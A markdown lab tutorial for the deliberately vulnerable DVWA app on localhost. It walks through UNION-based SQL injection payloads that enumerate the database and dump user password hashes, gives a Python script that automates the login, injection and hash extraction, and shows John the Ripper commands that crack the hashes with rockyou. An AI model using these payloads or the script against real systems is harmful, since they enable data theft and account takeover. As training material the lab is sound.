# Union-Based SQL Injection + Hash Dumping + Cracking with John

This markdown file explains how to:

1. Use **UNION-based SQL Injection** to enumerate DB info.
2. Extract user-password hash pairs from the `users` table.
3. Save the hashes.
4. Crack them with `rockyou.txt` + `John the Ripper`.

---

## 🔧 Prerequisites

- DVWA running locally (`http://localhost/dvwa/`)
- `requests`, `beautifulsoup4` installed
- `John the Ripper` installed
- `rockyou.txt` wordlist (unzipped)

---


## 🧠 Step-by-Step: SQL Injection with UNION

### Step 1 - Find number of columns

Use payload:

```
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
```

Increase the number until you get an error. That tells you how many columns are returned by the original query.

> Let’s say the error happens at `ORDER BY 5` → There are **4 columns**.

---

### Step 2 - Find visible column

Inject:

```
1' UNION SELECT 1,2,3,4 -- 
```

This helps you see which columns are **visible on screen**, so you know where to place your payload.

---

### Step 3 - Get DB name

Inject:

```
1' UNION SELECT database(),2,3,4 -- 
```

This returns the name of the current DB (usually `dvwa`).

---

### Step 4 - List tables

Use:

```
1' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='dvwa' -- 
```

Look for a table like `users`.

---

### Step 5 - List columns in users

Inject:

```
1' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users' -- 
```

You’ll find columns like `user` and `password`.

---

### Step 6 - Extract user hashes

Inject:

```
1' UNION SELECT user, password, 3, 4 FROM users -- 
```

---

## 🤖 Script: `union_dump_and_crack.py`

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

base_url = "http://localhost/dvwa/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli"
security_url = base_url + "security.php"

session = requests.Session()

# Get CSRF token from login
login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}
login_response = session.post(login_url, data=login_data)

if "Login failed" in login_response.text:
    print("[!] Login failed.")
    exit()

print("[+] Logged in.")

# Set security to low
sec_page = session.get(security_url)
soup = BeautifulSoup(sec_page.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]
session.post(security_url, data={"security": "low", "seclev_submit": "Submit", "user_token": token})

# Perform SQL Injection
payload = "1' UNION select user,password from dvwa.users -- "
params = {"id": payload, "Submit": "Submit"}
response = session.get(sqli_url, params=params)
soup = BeautifulSoup(response.text, "html.parser")

vuln_code = soup.find("div", {"class": "vulnerable_code_area"})
pre_tag = vuln_code.find_all('pre')

global_lines = []
for pre in pre_tag:
    text = pre.get_text(separator="|")
    lines = [line.strip() for line in text.split("|") if line.strip()]
    global_lines.extend(lines)

with open("users_and_hashes.txt", "w") as f_users, open("hashes.txt", "w") as f_hashes:
    username = None
    for line in global_lines:
        if "First name:" in line:
            username = line.replace("First name:", "").strip()
        if "Surname:" in line:
            password_hash = line.replace("Surname:", "").strip()
            f_users.write(f"{username}:{password_hash}\n")
            f_hashes.write(f"{password_hash}\n")
```

---

## 🛠️ Cracking Passwords with RockYou + John

### Step 1 - Unzip rockyou

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### Step 2 - Run John

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt users_and_hashes.txt
```

---

### Step 3 - View Cracked Passwords

```bash
john --show --format=raw-md5 users_and_hashes.txt
```

Example output:

```
admin:password
```

---

## ✅ Summary of Commands

```bash
# Unzip rockyou wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack hashes
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt users_and_hashes.txt

# Show results
john --show --format=raw-md5 users_and_hashes.txt
```
---
<pre> <p align="center"> <img src="../images/sqli_union_password_cracking.PNG" alt="Cracked Passwords Output" width="600"/> </p> <p align="center"><em>Figure: John the Ripper successfully cracking password hashes obtained via UNION-based SQL Injection</em></p> </pre>
---

## 💡 Tips

- You can also run a brute-force mode or use hashcat for GPU-based cracking.
- Consider adding logic in your script to directly invoke John and show results.

---
